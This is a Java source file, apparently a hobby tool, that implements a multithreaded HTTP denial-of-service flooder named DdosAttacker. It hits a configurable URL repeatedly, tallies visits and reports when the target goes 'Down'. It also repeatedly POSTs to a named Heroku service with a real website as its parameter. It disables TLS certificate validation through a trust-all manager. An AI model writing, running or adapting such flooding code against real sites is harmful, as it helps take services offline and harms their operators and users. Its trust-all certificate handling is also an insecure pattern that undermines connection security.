/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.attack.ddos;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

/**
 *
 * @author 88017
 */
public class DdosAttacker extends Thread {

    public static int totalVisited = 0;
    public static int singleUserVisitingTime = 0;
    public static String url = "";

    public void run() {
        try {
            // Displaying the thread that is running 
            //System.out.println("Thread " + Thread.currentThread().getId() + " is running");
            MultiThreadingDemo.visit(url);
            //DdosAttacker.postQuery(2);
        } catch (Exception e) {
            // Throwing an exception 
            System.out.println("Exception is caught");
        }
    }

}

// Main Class 
class MultiThreadingDemo {

    public static void postQuery(int numOfTimes) {
        for (int i = 0; i < numOfTimes; i++) {

            HttpClient httpclient = HttpClients.createDefault();
            HttpPost httppost = new HttpPost("http://online-spider.herokuapp.com/search");
            List<NameValuePair> params = new ArrayList<NameValuePair>(4);
            params.add(new BasicNameValuePair("pageURI", "https://toletbd.com"));
            try {
                httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
            } catch (UnsupportedEncodingException ex) {
                Logger.getLogger(DdosAttacker.class.getName()).log(Level.SEVERE, null, ex);
            }

//Execute and get the response.
            HttpResponse response = null;
            try {
                response = httpclient.execute(httppost);
            } catch (IOException ex) {
                Logger.getLogger(DdosAttacker.class.getName()).log(Level.SEVERE, null, ex);
            }
            HttpEntity entity = response.getEntity();

            if (entity != null) {
                try {
                    InputStream instream = entity.getContent();
                    BufferedReader br = new BufferedReader(new InputStreamReader(instream));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        stringBuilder.append(line + "\n");
                    }
                    br.close();
                    //System.out.println(instream);
                    System.out.println(stringBuilder);
                } catch (IOException ex) {
                    Logger.getLogger(DdosAttacker.class.getName()).log(Level.SEVERE, null, ex);
                } catch (UnsupportedOperationException ex) {
                    Logger.getLogger(DdosAttacker.class.getName()).log(Level.SEVERE, null, ex);
                }
                // do something useful

            }
        }
    }

    public static void visit(String urlStr) {
        for (int i = 0; i < DdosAttacker.singleUserVisitingTime; i++) {
            try {
                SSLContext sc = SSLContext.getInstance("TLS");
                sc.init(null, new TrustManager[]{tm}, null);
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setInstanceFollowRedirects(true);

                if (conn.getResponseCode() == 201 || conn.getResponseCode() == 200) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = br.readLine()) != null) {
                        stringBuilder.append(line + "\n");
                    }
                    br.close();
                    if (stringBuilder.toString().contains("Error")) {
                        System.out.println("Down");
                        //System.out.println(stringBuilder);
                        System.out.println("totalVisited: " + DdosAttacker.totalVisited);
                    } else {
                        DdosAttacker.totalVisited++;
                        //System.out.println(stringBuilder);
                        System.out.println("totalVisited: " + DdosAttacker.totalVisited);
                    }

                }
            } catch (IOException ex) {
                System.out.println("Down");
                System.out.println("totalVisited: " + DdosAttacker.totalVisited);
            } catch (NoSuchAlgorithmException ex) {
                System.out.println("Down");
                System.out.println("totalVisited: " + DdosAttacker.totalVisited);
            } catch (KeyManagementException ex) {
                System.out.println("Down");
                System.out.println("totalVisited: " + DdosAttacker.totalVisited);
            }
        }
    }
    static X509TrustManager tm = new TrustAllTrustManager();

    public static class TrustAllTrustManager implements X509TrustManager {

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
        }
    }
}
